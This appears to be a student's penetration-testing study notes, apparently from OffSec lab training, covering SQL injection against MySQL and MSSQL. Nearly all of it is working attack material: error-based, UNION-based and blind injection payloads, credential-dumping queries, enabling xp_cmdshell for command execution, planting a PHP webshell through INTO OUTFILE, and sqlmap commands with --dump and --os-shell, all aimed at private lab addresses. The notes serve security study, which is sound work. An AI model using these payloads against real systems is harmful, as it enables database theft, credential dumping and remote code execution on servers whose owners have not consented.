# DB Types and Characteristics

- MySQL
	- mysql -u root -p 'root' -h 192.168.50.16 -P 3306
		- version();
		- select system_user();
		- show databases;
		- SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
- MSSQL (windows)
	- SQLCMD
		- allows SQL commands through windows cmd or remotely
	- Impacket
		- python framework
		- supports TDS (MSSQL)
			- impacket-mssqlclient
		- Example:
			1. impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
				- -windows-auth forces NTLM over Kerberos
			2.  SELECT @@version;
			- If not using MSSQL TDS protocol, sqlcmd requires GO on seperate line
			3. SELECT name FROM sys.databases;
			4. select * FROM offsec.information_schema.tables;
			5. select * from offsec.dbo.users;
# Manual SQL Exploitation
## SQLi via Error-based payloads

- in-band SQLi = query result displayed & app-returned value

1. Prematurely terminate SQL statement
	- username' OR 1=1 -- //
		- ends up being this:
			- SELECT * FROM users WHERE user_name= 'username' OR 1=1 --
		- 1=1 will always be true:
			- returns first name
2. Enumerate
	- ' or 1=1 in (select @@version) -- //
	- ' OR 1=1 in (SELECT * FROM users) -- //
3. Selecting one entry
	- ' or 1=1 in (SELECT password FROM users) -- //
4. Adding a where clause to identify
	- ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
## UNION-based Payloads
- Same number of columns in both queries & data types compatible 
- Example:
	- \$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
	- Discover correct number of columns
		- ' ORDER BY 1-- //
			- will fail if not correct amount
	- Enumerate
		- %' UNION SELECT database(), user(), @@version, null, null -- //
	- Shifting columns
		- ' UNION SELECT null, null, database(), user(), @@version  -- //
	- Enumeration information schema
		- ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
	- Dumping users table
		- ' UNION SELECT null, username, password, description, null FROM users -- //
## Blind SQL Injections
- Time based or Boolean
- Boolean
	- http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
- Time based
	- http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
	- 
## Manual Code Execution
- xp_cmdshell
	- Microsoft SQL Server function
	- used by EXECUTE instead of SELECT
- Impacket
	1.  impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
	2. EXECUTE sp_configure 'show advanced options', 1;
		- Enabling advanced options
	1. RECONFIGURE;
		- Apply configuration
	2. EXECUTE sp_configure 'xp_cmdshell', 1;
		- Enabling xp_cmdshell
	3. RECONFIGURE;
	4. Test
		- EXECUTE xp_cmdshell 'whoami';
- SELECT INTO_OUTFILE
	- Can be abused for RCE
	1. UNION SELECT to include PHP line into the first column and save it as webshell.php
		- ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
		- File will include
			- <? system($_REQUEST['cmd']); ?>
	 2. http://192.169.120.19/tmp/webshell.php?cmd=id
## Automating the Attack
- [[sqlmap]]
	- [NO STEALTH]
	- Example:
		- sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
			- -u for URL
			- -p for parameter 
		- Dump entire database with --dump
			- sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
		- --os-shell
			- interactive shell
			- not ideal with time-based
			-  Intercept POST request via Burp & save it to local txt file.
				- ```
```POST /search.php HTTP/1.1
Host: 192.168.50.19
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://192.168.50.19
Connection: close
Referer: http://192.168.50.19/search.php
Cookie: PHPSESSID=vchu1sfs34oosl52l7pb1kag7d
Upgrade-Insecure-Requests: 1

item=test
```
- sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
	- -r to use file as post message
	- -p item for parameter
	- --os-shell for shell
	- --web-root for ???
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
- PostGreSQL
	- psql --help